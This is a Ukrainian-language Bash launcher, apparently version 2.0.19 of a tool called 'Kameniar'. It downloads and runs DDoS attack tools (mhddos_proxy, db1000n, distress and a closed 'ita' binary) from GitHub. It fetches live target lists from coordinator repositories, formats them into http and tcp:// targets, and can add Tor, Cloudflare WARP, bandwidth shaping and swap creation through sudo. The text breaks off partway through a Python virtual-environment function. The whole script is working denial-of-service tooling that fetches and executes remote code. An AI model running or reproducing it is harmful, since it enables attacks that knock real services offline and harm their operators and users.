#!/bin/bash
set -e
set -u
set -o pipefail
###############################################################################
export str_version="2.0.19 pre-beta"
###############################################################################
export opt_gotop="off"
export opt_type="normal"
export opt_shaper="off"
export opt_cloudflare="off"
export opt_debug="off"
export opt_db1000n="off"
export opt_recreate="off"
export opt_uninstall="off"
export opt_open_mhddos="on"
export args_to_pass=""
export opt_skip_dependencies="off"
export opt_getting_targets="on"
export opt_quiet="off"
export opt_distress="off"
export opt_distress_usetor="off"
export opt_distress_myip="off"
while [[ $# -gt 0 ]]; do
    case $1 in
    -g | --gotop)
        export opt_gotop="on"
        shift
        ;;
    -n | --normal)
        export opt_type="normal"
        shift
        ;;
    -f | --full)
        export opt_type="full"
        shift
        ;;
    -e | --enormous)
        export opt_type="enormous"
        shift
        ;;
    -s | --shape)
        export opt_shaper="on"
        export shape_limit="$(($2 * 1024))"
        shift 2
        ;;
    -c | --cloudflare)
        export opt_cloudflare="on"
        shift
        ;;
    -d | --db1000n)
        export opt_db1000n="on"
        shift
        ;;
    -t | --distress)
        export opt_distress="on"
        shift
        ;;
    -w | --debug)
        export opt_debug="on"
        shift
        ;;
    -r | --recreate)
        export opt_recreate="on"
        shift
        ;;
    -u | --uninstall)
        export opt_uninstall="on"
        shift
        ;;
    --skip-dependency-version)
        export opt_skip_dependencies="on"
        shift
        ;;
    --shutup)
        export opt_quiet="on"
        shift
        ;;
    --distress-tor)
        export opt_distress_usetor="on"
        shift
        ;;
    --distress-my-ip)
        export opt_distress_myip="on"
        shift
        ;;
    *)
        export args_to_pass+=" $1"
        shift
        ;; #pass all unrecognized arguments to mhddos_proxy
    esac
done

if [[ "$opt_debug" == "on" ]]; then
    set -x
fi

###############################################################################
# Most basic setup here
###############################################################################
export script_path="$HOME/multiddos_ii"

if [[ $opt_recreate == "on" ]]; then
    rm -rf "$script_path"
fi
if [[ $opt_uninstall == "on" ]]; then
    rm -rf "$script_path"
    exit 0
fi

###############################################################################
# Put links here
###############################################################################
export link_gotop_x32="https://github.com/xxxserxxx/gotop/releases/download/v4.2.0/gotop_v4.2.0_linux_386.tgz"
export link_gotop_x64="https://github.com/xxxserxxx/gotop/releases/download/v4.2.0/gotop_v4.2.0_linux_amd64.tgz"
export link_gotop_x64_darwin="https://github.com/xxxserxxx/gotop/releases/download/v4.2.0/gotop_v4.2.0_darwin_amd64.tgz"
export link_gotop_arm_darwin="https://github.com/xxxserxxx/gotop/releases/download/v4.2.0/gotop_v4.2.0_darwin_arm64.tgz"
export link_gotop_arm8="https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_arm8.tgz"
export link_gotop_arm7="https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_arm7.tgz"
export link_gotop_x64_freebsd="https://github.com/xxxserxxx/gotop/releases/download/v4.2.0/gotop_v4.2.0_freebsd_amd64.tgz"

export link_db1000n_x32="https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_386.tar.gz"
export link_db1000n_x64="https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_amd64.tar.gz"
export link_db1000n_x64_darwin="https://github.com/Arriven/db1000n/releases/latest/download/db1000n_darwin_amd64.tar.gz"
export link_db1000n_arm_darwin="https://github.com/Arriven/db1000n/releases/latest/download/db1000n_darwin_arm64.tar.gz"
export link_db1000n_x64_freebsd="https://github.com/Arriven/db1000n/releases/latest/download/db1000n_freebsd_amd64.tar.gz"
export link_db1000n_arm_freebsd="https://github.com/Arriven/db1000n/releases/latest/download/db1000n_freebsd_arm64.tar.gz"

export link_jq_x32="https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux32"
export link_jq_x64="https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64"
export link_jq_x64_macos="https://github.com/stedolan/jq/releases/download/jq-1.6/jq-osx-amd64"

export link_wondershaper="https://github.com/magnific0/wondershaper/archive/refs/heads/master.zip"

export link_tmux_x64="https://github.com/mosajjal/binary-tools/raw/master/x64/tmux"

export link_mhddos_proxy="https://github.com/LordWarWar/mhddos_proxy/archive/refs/heads/main.zip"

export link_mhddos_ita_x64="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
export link_mhddos_ita_arm_x64="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux_arm64"

export link_distress_x32="https://github.com/Yneth/distress-releases/releases/latest/download/distress_i686-unknown-linux-musl"
export link_distress_x64="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
export link_distress_arm="https://github.com/Yneth/distress-releases/releases/latest/download/distress_arm-unknown-linux-musleabi"
export link_distress_aarch64="https://github.com/Yneth/distress-releases/releases/latest/download/distress_aarch64-unknown-linux-musl"
export link_distress_aarch64_darwin="https://github.com/Yneth/distress-releases/releases/latest/download/distress_aarch64-apple-darwin"
export link_distress_x64_darwin="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-apple-darwin"

export link_pip="https://bootstrap.pypa.io/get-pip.py"

export link_cf_centos8="https://pkg.cloudflareclient.com/cloudflare-release-el8.rpm"

export link_shtools="ftp://ftp.gnu.org/gnu/shtool/shtool-2.0.8.tar.gz"

export link_unzip="https://oss.oracle.com/el4/unzip/unzip.tar"

# Array with targetlists went to get_targets()
# Bash does not support array exporting
export link_itarmy_json="https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json"
# Array with paths went to get_targets()
# bash does not support array exporting
export helper_link_python="https://freehost.com.ua/ukr/faq/articles/kak-ustanovit-python-na-linux/"
export link_banner="https://raw.githubusercontent.com/ahovdryk/aio_reaper/main/banner"

###############################################################################
# Put strings here
###############################################################################

export str_ok="OK"
export str_done="Виконано"
export str_downloading="Завантажую"
export str_probing="Перевіряю наявність"
export str_motto="Зі смаком опенсорсу"
export str_name="Каменяр"
export str_found="знайдено."
export str_startup="Стартує $str_name"
export str_notfound="не знайдено"
export str_fatal="Продовження роботи неможливе."
export str_need_root="Потрібні права адміністратора"
export str_root_required=" не може працювати без адміністративних прав. Вимкнено."
export str_instructions="Інструкції по встановленню ви зможете знайти тут:"
export str_press_any_key="Натисніть Ентер [⏎] для завершення..."
export str_dir_create_failed="Не вдалося створити підкаталог в каталозі користувача."
export str_getting_targets="Отримую список цілей"
export str_targets_got="Цілей отримано:"
export str_targets_prepare="Підготовка цілей"
export str_all_targets="Всього отримано цілей:"
export str_targets_uniq="Всього унікальних цілей:"
export str_swap_required="Недостатньо пам'яті, спробуємо створити своп. ${str_need_root}"
export str_cf_no_go="Cloudflare WARP не підтримується на цій системі. Вимкнено."
export str_venv_creating="Створюємо віртуальне оточення Python..."
export str_shape="Запускаю шейпер."
export str_no_tmux="tmux не знайдено в вашій системі. Запуск gotop недоцільний. Вимкнено."
export str_start_cleanup="Починаємо очистку після роботи..."
export str_cleaning="Зупиняю роботу"
export str_venv_failed="Не вдалося створити віртуальне оточення Пітону."
export str_swap_failed="Створення додаткового swap-файлу не вдалось. Можлива дуже повільна робота."
export str_fallback_ita="Запуск відкритого клону неможливий. Переключаюсь на закриту версію."
export str_definitely_no_root="Запуск закритого mhddos_proxy з правами root вкрай небажаний. Вимкнено."
export str_no_tool="Нічим атакувати. Вмикаю db1000n."
export str_check_internet="Перевіряю наявність інтернету."
export str_no_internet="Зник інтернет. Скрипт на паузі."
export str_internet_restored="Інтернет знову наявний. Відновлюю роботу."
export str_downloading_software="Завантажую і розпаковую потрібний для роботи софт."
str_tmux_x32=$(
    cat <<-END
Нажаль tmux ніхто не збирає для 32-бітних систем в якості самодостатньої програми.
Для використання всіх функцій скрипту вам доведеться встановити його самостійно.
END
)
export str_tmux_x32
str_running_as_root=$(
    cat <<-END
Скрипт визначив, що його запущено з адміністративними правами.
Якщо ви не використовуєте шейпер, то це не потрібно, навіть шкідливо.
Подумайте над тим, щоби запустити без рута/sudo.
END
)
export str_running_as_root
str_end=$(
    cat <<-END
Прибирання завершено. Дякую за ваш внесок.
Нетерпляче чекаю вашого повернення.
END
)
export str_end
###############################################################################
# Here comes execution variables
###############################################################################
os_bits=$(getconf LONG_BIT)
if [ "$os_bits" != "64" ]; then
    os_bits="32"
fi
export os_bits

internet_interface=$(ip -o -4 route show to default | awk '{print $5}')
export internet_interface
export script_jq="null"
export script_tmux="null"
export script_gotop="null"
export script_unzip="null"
export script_db1000n="null"
export script_wondershaper="null"
export script_unzip="null"
export script_distress="null"

if ! command -v sudo >/dev/null 2>&1; then
    export script_have_sudo="false"
else
    export script_have_sudo="true"
fi

# Disencourage to use root!
if [[ "$EUID" == 0 ]]; then
    export script_is_root="true"
else
    export script_is_root="false"
fi

###############################################################################
# Main script flow
###############################################################################

function main() {
    if [[ $opt_gotop == "on" ]]; then
        export opt_quiet="off"
    fi
    printf "%s %s...\n" "$str_startup" "$str_version"
    ###############################################################################
    # Checking if we are root
    if [[ $script_is_root == true ]]; then
        echo -ne '\007'
        print_error "$str_running_as_root"
    fi
    ###############################################################################
    # Checking for write permissions to user folder
    mkdir -p "$script_path" >/dev/null 2>&1
    if [[ ! -d "$script_path" ]]; then
        print_error "\n$str_dir_create_failed"
        print_error "$str_fatal"
        echo -ne '\007'
        printf "%s\n" "$str_press_any_key"
        read -r
        exit 0
    fi
    cd "$script_path"
    mkdir -p "$script_path/bin" >/dev/null 2>&1
    mkdir -p "$script_path/targets" >/dev/null 2>&1
    ###############################################################################
    # Checking for write permissions to user folder
    mkdir -p "$script_path" >/dev/null 2>&1
    if [[ ! -d "$script_path" ]]; then
        print_error "$str_dir_create_failed"
        print_error "$str_fatal"
        echo -ne '\007'
        printf "%s\n" "$str_press_any_key"
        read -r
        exit 0
    fi
    cd "$script_path"
    mkdir -p "$script_path/bin" >/dev/null 2>&1
    mkdir -p "$script_path/targets" >/dev/null 2>&1
    ###############################################################################
    printf "%s\n" "$str_motto"
    ###############################################################################
    # Downloading and running platform tools
    local plat_tool="$script_path/bin/shtool-2.0.8/sh.platform"
    local output_path="$script_path/bin/shtools.tar.gz"
    local shtools_path="$script_path/bin/shtool-2.0.8/"

    ###############################################################################
    # Waiting for internet connection
    wait_for_internet
    ###############################################################################
    # Wondering why we need --disable-epsv? Ask Free Software Foundation
    # They have had this bug in their software for ages.
    printf "%s" "$str_downloading platform tools"
    while [[ ! -f $plat_tool ]]; do
        curl -s -L --retry 10 --output "$output_path" --url $link_shtools --disable-epsv >/dev/null 2>&1
        tar -xzf "$output_path" -C "$script_path/bin/" >/dev/null 2>&1
        rm -f "$output_path" >/dev/null 2>&1
    done
    printf "%s\n" "$str_done"

    local plat_output
    cd "$shtools_path"
    plat_output=$(bash "$plat_tool" -v -F "%[at] %{sp} %[st]")
    cd "$script_path"
    local rest=$plat_output
    os_arch="${rest%% *}"
    rest="${rest#* }"
    os_dist="${rest%% *}"
    rest="${rest#* }"
    os_version="${rest%% *}"
    rest="${rest#* }"
    os_family="${rest%% *}"
    rest="${rest#* }"
    os_kernel="${rest%% *}"
    os_kernel="${os_kernel///}"
    os_version_major="${os_version%.*}"

    # TODO Make strings, check the variables!
    printf "OS:%-15sDistrib: %-15sVersion:%-15s\n" "$os_family" "$os_dist" "$os_version"
    printf "Arch:%-15sKernel:%-15s\n" "$os_arch" "$os_kernel"
    ###############################################################################
    # If we need root
    if [[ $opt_cloudflare == "on" ]] || [[ "$opt_shaper" == "on" ]]; then
        printf "%s\n" "$str_need_root"
        sudo true
    fi
    ###############################################################################
    # Getting unzip
    printf "%s unzip... " "$str_probing"
    if ! command -v unzip >/dev/null 2>&1; then
        wait_for_internet
        curl -s -L --url $link_unzip --output "$script_path/unzip.tar"
        tar -xf "$script_path/unzip.tar" -C "$script_path/bin/"
        chmod +x "$script_path/bin/unzip"
        export script_unzip="$script_path/bin/unzip"
        printf "%s\n" "$str_found"
    else
        export script_unzip="unzip"
        printf "%s\n" "$str_found"
    fi
    ###############################################################################
    # Checking for Python 3
    printf "%s Python 3... " "$str_probing"
    if ! command -v python3 >/dev/null 2>&1; then
        print_error "\nPython $str_notfound\n"
        echo -ne '\007'
        print_error "$str_instructions\n$helper_link_python"
        printf "%s\n" "$str_fallback_ita"
        export opt_open_mhddos="off"
    else
        printf "%s\n" "$str_found"
    fi
    ###############################################################################
    # We have the python. Now we need to ensure pip
    # We know the major version of Python. It's 3.
    # All of the following is needed only if Python avaliable
    if [[ $opt_open_mhddos == "on" ]]; then
        pip_fatal_fail="false"
        python_commands='import sys; version=sys.version_info[:3]; print("{1}".format(*version))'
        python_subversion=$(python3 -c "$python_commands")
        if [[ $python_subversion -lt 8 ]]; then
            printf "%s\n" "$str_fallback_ita"
            export opt_open_mhddos="off"
        fi
        pip_output=$(
            python3 - <<EOF
try:
    import pip;
    print("Pip installed!")
except Exception:
    print("Pip failed!")
EOF
        )

        if [[ ("$pip_output" == "Pip installed!") && ($opt_open_mhddos == "on") ]]; then
            # py_havepip="true"
            true
        else
            if [[ ($python_subversion -lt 8) && ($opt_open_mhddos == "on") ]]; then
                printf "%s\n" "$str_fallback_ita"
                export opt_open_mhddos="off"
            elif [[ $opt_open_mhddos == "on" ]]; then
                link_getpip="https://bootstrap.pypa.io/get-pip.py"
                while [[ ! -f "$script_path/get_pip.py" ]]; do
                    wait_for_internet
                    curl -s -L --retry 10 --output "$script_path/get_pip.py" --url "$link_getpip"
                done
                python3 "$script_path/get_pip.py" --user >/dev/null 2>&1 || pip_fatal_fail="true"
            fi

        fi
        if [[ $pip_fatal_fail == "true" ]]; then
            printf "%s\n" "$str_fallback_ita"
            export opt_open_mhddos="off"
        fi
    fi
    ###############################################################################
    # Pre-create virtual environment
    if [[ $opt_open_mhddos == "on" ]]; then
        if [[ ! -f "$script_path/venv/bin/activate" ]]; then
            venv_prepare
        fi
    fi
    ###############################################################################
    # Trying to create a swap uf low on memory
    if [[ $(swapon --noheadings --bytes | cut -d " " -f3) == "" ]]; then
        export swap_failed="false"
        printf "%s\n%s.\n" "$str_swap_required" "$str_need_root"
        if [[ $script_have_sudo == "true" ]]; then
            sudo fallocate -l 1G /swp || swap_failed="true"
            sudo chmod 600 /swp || swap_failed="true"
            sudo mkswap /swp || swap_failed="true"
            sudo swapon /swp || swap_failed="true"
        elif [[ "$script_is_root" == "true" ]]; then
            fallocate -l 1G /swp || swap_failed="true"
            chmod 600 /swp || swap_failed="true"
            mkswap /swp || swap_failed="true"
            swapon /swp || swap_failed="true"
        else
            swap_failed="true"
        fi
        if [[ $swap_failed == "true" ]]; then
            printf "%s\n" "$str_swap_failed"
        fi
    fi
    ###############################################################################
    #
    printf "%s" "$str_downloading_software"
    ###############################################################################
    # Checking if jq installed and grabbing a local copy if not
    if [[ $opt_getting_targets == "on" ]]; then
        get_jq
    fi

    ###############################################################################
    if [[ "$opt_gotop" == "on" ]]; then
        get_tmux
    fi
    ###############################################################################
    # Downloading fresh db1000n
    if [[ "$opt_db1000n" == "on" ]]; then
        get_db1000n
    fi
    ###############################################################################
    # Downloading fresh distress
    if [[ $opt_distress == "on" ]]; then
        get_distress
    fi
    ###############################################################################
    # Checking for gotop
    if [[ ($script_tmux == "null") && ($opt_gotop == "on") ]]; then
        opt_gotop="off"
        printf "%s\n" "$str_no_tmux"
    elif [[ $opt_gotop == "on" ]]; then
        get_gotop
    fi
    printf "%s\n" "$str_done"
    ###############################################################################
    # Downloading wondershaper if we didn't yet
    if [[ "$opt_shaper" == "on" ]]; then
        if [[ ($script_is_root == "true") || ($script_have_sudo == true) ]]; then
            printf "%s wondershaper... " "$str_probing"
            script_wondershaper="$script_path/bin/wondershaper/wondershaper"
            export script_wondershaper
            if [[ ! -f $script_wondershaper ]]; then
                printf "%s\n" "$str_notfound"
                get_wondershaper
                chmod +x "$script_wondershaper"
                cd "$script_path"
            else
                printf "%s\n" "$str_found"
            fi
        else
            printf "%s" "Wondershaper $str_root_required"
            opt_shaper="off"
        fi
    fi

    ###############################################################################
    # Getting cloudflare-warp
    if [[ $opt_cloudflare == "true" ]]; then
        cf_warp
    fi
    ###############################################################################
    # ITA tool fallback
    if [[ ($script_is_root == "true") && ($opt_open_mhddos == "off") ]]; then
        printf "%s\n" "$str_definitely_no_root"
        if [[ "$opt_db1000n" == "off" ]]; then
            printf "%s\n" "$str_no_tool"
            export opt_db1000n="on"
            get_db1000n
        fi
    fi
    if [[ ($script_is_root == "false") && ($os_bits == "64") && ($opt_open_mhddos == "off") ]]; then
        # if [[ $os_arch == "AMD64" ]]
        # then
        # Later: arm support
        download_link=$link_mhddos_ita_x64
        # fi
        if [[ -f "$script_path/bin/ita" ]]; then
            rm -f "$script_path/bin/ita"
        fi
        while [[ ! -f "$script_path/bin/ita" ]]; do
            curl -s -L --retry 10 --output "$script_path/bin/ita" --url $download_link
        done
        chmod +x "$script_path/bin/ita"

    fi
    ###############################################################################
    # Create runner script
    create_autobash
    ###############################################################################
    # Shaping internet connection if requested
    if [[ $opt_shaper == "on" ]]; then
        printf "%s %s\n" "$str_shape" "$str_need_root"
        if [[ $script_is_root == "true" ]]; then
            "$script_wondershaper" -a "$internet_interface" -u "$shape_limit" -d "$shape_limit"
        elif [[ $script_have_sudo == "true" ]]; then
            sudo "$script_wondershaper" -a "$internet_interface" -u "$shape_limit" -d "$shape_limit"
        else
            export opt_shaper="off"
            printf "%s\n" "Wondershaper $str_need_root"
        fi
    fi
    ###############################################################################
    # Final launching sequence
    if [[ "$opt_gotop" == "on" ]]; then
        if [ $script_tmux != "null" ]; then
            # tmux mouse support
            # kill our sessions.
            $script_tmux list-sessions |
                grep multidd |
                awk 'BEGIN{FS=":"}{print $1}' |
                xargs -n 1 $script_tmux kill-session -t || true >/dev/null 2>&1
            grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >>~/.tmux.conf
            { $script_tmux new-session -s multidd -d "$script_gotop -sc solarized"; } >/dev/null 2>&1
            { $script_tmux split-window -h -l 80 "bash $script_path/auto_bash.sh"; } >/dev/null 2>&1
            $script_tmux attach-session -t multidd >/dev/null 2>&1
        else
            printf "%s\n" "$str_no_tmux"
            bash "$script_path/auto_bash.sh"
        fi
    else
        bash "$script_path/auto_bash.sh"
    fi

    ###############################################################################

    cleanup
}
###############################################################################
# Functions
###############################################################################
function get_targets() {
    wait_for_internet
    if [[ $opt_getting_targets == "off" ]]; then
        return 0
    fi
    declare -a json_itarmy_paths=(
        ".jobs[].args.packet.payload.data.path"
        ".jobs[].args.connection.args.address"
    )
    declare -a link_targetlist_array=(
        "https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt"
    )
    printf "%s\n" "$str_getting_targets"
    if [ -d "$script_path/targets" ]; then
        rm -rf "$script_path/targets" >/dev/null 2>&1
        mkdir -p "$script_path/targets/"
    fi
    cd "$script_path"

    local targets_got=0
    #####
    while [[ $targets_got == 0 ]]; do
        json=$(curl -s --retry 10 -L --url "$link_itarmy_json") >/dev/null 2>&1
        local num=1
        for path in "${json_itarmy_paths[@]}"; do
            touch "$script_path/targets/list$num.txt"
            lines=$(echo "$json" | $script_jq -r "$path" | sed '/null/d')
            if [[ $path == ".jobs[].args.connection.args.address" ]]; then
                touch "$script_path/targets/list$num.txt"
                for line in $lines; do
                    local output
                    output="tcp://$line"
                    echo "$output" >>"$script_path/targets/list$num.txt"
                done
            else
                echo "$lines" >>"$script_path/targets/list$num.txt"
            fi
            targets_got=$(wc -l <"$script_path/targets/list$num.txt")
            #printf "%s %s\n" "$str_targets_got" "$targets_got"
            num=$((num + 1))
        done
    done
    rm -f "$script_path/targets/db1000n.json" >/dev/null 2>&1

    for file in "$script_path"/targets/*.txt; do
        sed -i '/^[[:space:]]*$/d' "$file"
        cat "$file" >>"$script_path/targets/itarmy.list"
    done
    #####
    if [[ $opt_type != "normal" ]]; then
        for list in "${link_targetlist_array[@]}"; do
            curl -s -X GET --url "$list" --output "$script_path/targets/list$num.txt"
            targets_got=$(wc -l <"$script_path/targets/list$num.txt")
            printf "%s %s\n" "$str_targets_got" "$targets_got"
            num=$((num + 1))
        done
        #printf "%s...\n" "$str_targets_prepare"
        #sed -i '/^[[:space:]]*$/d' "$script_path/targets/*.txt"
        for file in "$script_path"/targets/*.txt; do
            sed -i '/^[[:space:]]*$/d' "$file"
        done

        for file in "$script_path"/targets/*.txt; do
            cat "$file" >>"$script_path/targets/_targets.txt"
            rm -f "$file"
        done
        lines=$(cat "$script_path/targets/_targets.txt")
        rm -f "$script_path/targets/_targets.txt"
        for line in $lines; do
            if [[ $line == "http"* ]] || [[ $line == "tcp://"* ]]; then
                echo "$line" >>"$script_path/targets/all_targets.txt"
            fi
        done
        sort <"$script_path/targets/all_targets.txt" |
            uniq |
            sort -R >"$script_path/targets/uniq_targets.txt"
        rm -f "$script_path/targets/all_targets.txt"
        local uniq_targets
        uniq_targets=$(wc -l <"$script_path/targets/uniq_targets.txt")
        printf "%s %s. \n" "$str_targets_uniq" "$uniq_targets"
    else
        sort <"$script_path/targets/itarmy.list" |
            uniq |
            sort -R >"$script_path/targets/uniq_targets.txt"
        rm -f "$script_path/targets/itarmy.list"
        local uniq_targets
        uniq_targets=$(wc -l <"$script_path/targets/uniq_targets.txt")
        printf "%s %s. \n" "$str_targets_uniq" "$uniq_targets"
        mv -f "$script_path/targets/uniq_targets.txt" "$script_path/targets/itarmy.list"
    fi
}
export -f get_targets
###############################################################################
# Kill process by path
###############################################################################
function pathkill() {
    # read this BEFORE fixing:https://www.baeldung.com/linux/reading-output-into-array
    local path="$*"
    #shellcheck disable=2009
    # pgrep does not work with python scripts in desired way
    IFS=$'\n' read -r -d '' -a pids < <(ps aux | grep "$path" | awk '{print $2}' && printf '\0')
    for pid in $pids; do
        kill -9 "$pid" >/dev/null 2>&1
    done
}
export -f pathkill
###############################################################################
# Check if process is running
###############################################################################
function proc_check() {
    local path="$*"
    #shellcheck disable=2009
    # pgrep does not work with python scripts in desired way
    IFS=$'\n' read -r -d '' -a pids < <(ps aux | grep "$path" | awk '{print $2}' && printf '\0')
    pids_num=${#pids[@]}
    echo "$pids_num"
}
export -f proc_check
###############################################################################
# Cleanup, disconnect, etc...
###############################################################################
function cleanup() {
    printf "%s\n" "$str_start_cleanup"
    printf "%s mhddos_proxy: " "$str_cleaning"
    pkill -f "$script_path/mhddos_proxy/runner.py" || true
    rm -rf "$script_path/mhddos_proxy" || true
    printf "%s\n" "$str_done"
    if [ "$opt_shaper" == "on" ]; then
        printf "%s wondershaper: " "$str_cleaning"
        if [[ $script_have_sudo ]]; then
            sudo "$script_wondershaper" -c -a "$internet_interface" || true
        elif [[ $script_is_root ]]; then
            "$script_wondershaper" -c -a "$internet_interface" || true
        fi
        printf "%s\n" "$str_done"
    fi
    if [ "$opt_cloudflare" == "on" ]; then
        printf "%s Cloudflare Warp: " "$str_cleaning"
        warp-cli disconnect || true
        if [[ ! $(check_dns) ]]; then
            if [[ -f "$script_path/resolv.conf.backup" ]]; then
                sudo rm -f /etc/resolv.conf
                sudo cp "$script_path/resolv.conf.backup" /etc/resolv.conf
                sudo rm -f "$script_path/resolv.conf.backup"
            fi
        fi
        if [[ ! $(check_dns) ]]; then
            restore_dns
        fi
    fi
    if [[ ($opt_db1000n == "on") && ($script_db1000n != "null") ]]; then
        printf "%s db1000n: " "$str_cleaning"
        pkill -f "$script_db1000n" || true
        printf "%s\n" "$str_done"
    fi
    if [[ ($opt_distress == "on") && ($script_distress != "null") ]]; then
        printf "%s distress: " "$str_cleaning"
        pkill -f "$script_distress" || true
        printf "%s\n" "$str_done"
    fi
    if [ $opt_gotop == "on" ]; then
        printf "%s tmux: " "$str_cleaning"
        $script_tmux list-sessions |
            grep multidd |
            awk 'BEGIN{FS=":"}{print $1}' |
            xargs -n 1 $script_tmux kill-session -t || true >/dev/null 2>&1
        printf "%s\n" "$str_done"
    fi
    printf "%s\n" "$str_end"
}
export cleanup
###############################################################################
#
###############################################################################
function print_error() {
    printf "%s\n" "$*" >&2
}
export -f print_error
###############################################################################
#
###############################################################################
function skip_dependencies() {
    local requirements
    requirements=$(cat "$script_path/mhddos_proxy/requirements.txt")
    if [[ -f "$script_path/mhddos_proxy/new_req.txt" ]]; then
        rm -f "$script_path/mhddos_proxy/new_req.txt"
    fi
    for line in $requirements; do
        local temp=""
        if [[ $line == *">="* ]]; then
            temp=${line%%>=*}
        elif [[ $line == *"=="* ]]; then
            temp=${line%%==*}
        fi
        echo "$temp" >>"$script_path/mhddos_proxy/new_req.txt"
    done

}
export -f skip_dependencies
###############################################################################
#
###############################################################################
function get_mhddos_proxy() {
    while [[ ! -d "$script_path/mhddos_proxy" ]]; do
        while [[ ! -f "$script_path/mhddos_proxy.zip" ]]; do
            wait_for_internet
            curl -s -L --url $link_mhddos_proxy --output "$script_path/mhddos_proxy.zip"
        done
        $script_unzip "$script_path/mhddos_proxy.zip" -d "$script_path" >/dev/null 2>&1
        mv "$script_path/mhddos_proxy-main" "$script_path/mhddos_proxy"
        rm -f "$script_path/mhddos_proxy.zip"
    done
}
export -f get_mhddos_proxy
###############################################################################
#
###############################################################################
function get_distress() {
    if [[ -f "$script_path/bin/distress.old" ]]; then
        rm -f "$script_path/bin/distress.old"
    fi
    if [[ -f "$script_path/bin/distress" ]]; then
        mv "$script_path/bin/distress" "$script_path/bin/distress.old"
    fi
    if [[ "$os_bits" == "32" ]]; then
        download_link=$link_distress_x32
    fi
    if [[ "$os_bits" == "64" ]]; then
        download_link=$link_distress_x64
    fi
    while [[ ! -f "$script_path/bin/distress" ]]; do
        wait_for_internet
        curl -s -L --retry 10 --output "$script_path/bin/distress" --url $download_link
        chmod +x "$script_path/bin/distress"
    done
    export script_distress="$script_path/bin/distress"
}
export -f get_distress
###############################################################################
#
###############################################################################
function get_db1000n {
    if [[ -f "$script_path/bin/db1000n.old" ]]; then
        rm -f "$script_path/bin/db1000n.old"
    fi
    if [[ -f "$script_path/bin/db1000n" ]]; then
        mv "$script_path/bin/db1000n" "$script_path/bin/db1000n.old"
    fi
    if [[ "$os_bits" == "32" ]]; then
        download_link=$link_db1000n_x32
    fi
    if [[ "$os_bits" == "64" ]]; then
        download_link=$link_db1000n_x64
    fi
    while [[ ! -f "$script_path/bin/db1000n" ]]; do
        wait_for_internet
        curl -s -L --retry 10 --output "$script_path/bin/db1000n.tar.gz" --url $download_link
        tar -xzf "$script_path/bin/db1000n.tar.gz" -C "$script_path/bin/"
        rm -f "$script_path/bin/db1000n.tar.gz"
        chmod +x "$script_path/bin/db1000n"
    done
    export script_db1000n="$script_path/bin/db1000n"
}
export -f get_db1000n
###############################################################################
#
###############################################################################
function get_wondershaper() {
    while [[ ! -f "$script_path/bin/wondershaper" ]]; do
        wait_for_internet
        curl -s -L --url $link_wondershaper --output "$script_path/wondershaper.zip"
        $script_unzip "$script_path/wondershaper.zip" -d "$script_path" >/dev/null 2>&1
        rm -rf "$script_path/bin/wondershaper"
        mv "$script_path/wondershaper-master" "$script_path/bin/wondershaper"
        rm -f "$script_path/wondershaper.zip"
    done
}
export -f get_wondershaper
###############################################################################
#
###############################################################################
function get_jq() {
    if ! command -v jq >/dev/null 2>&1; then
        # We have a local copy, use that
        if [[ -f "$script_path/bin/jq" ]]; then
            script_jq="$script_path/bin/jq"
            export script_jq
        fi
        # We don't have a local copy.
        if [[ "$script_jq" == "null" ]]; then
            if [[ $os_bits == "64" ]]; then
                download_link=$link_jq_x64
            fi
            if [[ $os_bits == "32" ]]; then
                download_link=$link_jq_x32
            fi
            while [[ ! -f "$script_path/bin/jq" ]]; do
                wait_for_internet
                curl -s -L --retry 10 --output "$script_path/bin/jq" --url $download_link
                chmod +x "$script_path/bin/jq"
            done
            script_jq="$script_path/bin/jq"
            export script_jq
        fi
    else
        # System jq found
        script_jq="jq"
        export script_jq
    fi
}
export -f get_jq
###############################################################################
#
###############################################################################
function get_gotop() {
    if ! command -v gotop &>/dev/null; then

        if [[ -s "$script_path/bin/gotop" ]]; then
            script_gotop="$script_path/bin/gotop"
            export script_gotop
        fi
        if [[ "$script_gotop" == "null" ]]; then
            if [[ $os_bits == "64" ]]; then
                download_link=$link_gotop_x64
            fi
            if [[ $os_bits == "32" ]]; then
                download_link=$link_gotop_x32
            fi
            while [[ ! -s "$script_path/bin/gotop.tgz" ]]; do
                wait_for_internet
                curl -s -L --retry 10 --output "$script_path/bin/gotop.tgz" --url $download_link
            done
            tar -xzf "$script_path/bin/gotop.tgz" -C "$script_path/bin/"
            rm -f "$script_path/bin/gotop.tgz"
            chmod +x "$script_path/bin/gotop"
            script_gotop="$script_path/bin/gotop"
            export script_gotop
        fi
    else
        script_gotop="gotop"
        export script_gotop
    fi
}
export -f get_gotop
###############################################################################
#
###############################################################################
function get_tmux() {
    # Checking for tmux
    if ! command -v tmux >/dev/null 2>&1; then
        if [[ -f "$script_path/bin/tmux" ]]; then
            script_tmux="$script_path/bin/tmux"
            export script_tmux
        fi
        if [[ "$script_tmux" == "null" ]]; then
            if [[ $os_bits == "64" ]]; then
                while [[ ! -f "$script_path/bin/tmux" ]]; do
                    wait_for_internet
                    curl -s -L --retry 10 --output "$script_path/bin/tmux" --url $link_tmux_x64
                done
                chmod +x "$script_path/bin/tmux"
                script_tmux="$script_path/bin/tmux"
            fi
            if [[ $os_bits == "32" ]]; then
                printf "\n %s" "$str_tmux_x32\n"
                script_tmux="null"
            fi
        fi
    else
        script_tmux="tmux"
        export script_tmux
    fi
}
export -f get_tmux
###############################################################################
#
###############################################################################
function venv_prepare() {
    venv_output=$(
        python3 - <<EOF
try:
    import venv;
    print("venv installed!")
except Exception:
    print("venv failed!")
EOF
    )
    if [[ $venv_output == "venv installed!" ]]; then
        export py_venv="python3 -m venv"
        $py_venv "$script_path/venv" >/dev/null 2>&1 || venv_output="venv failed!"
    fi
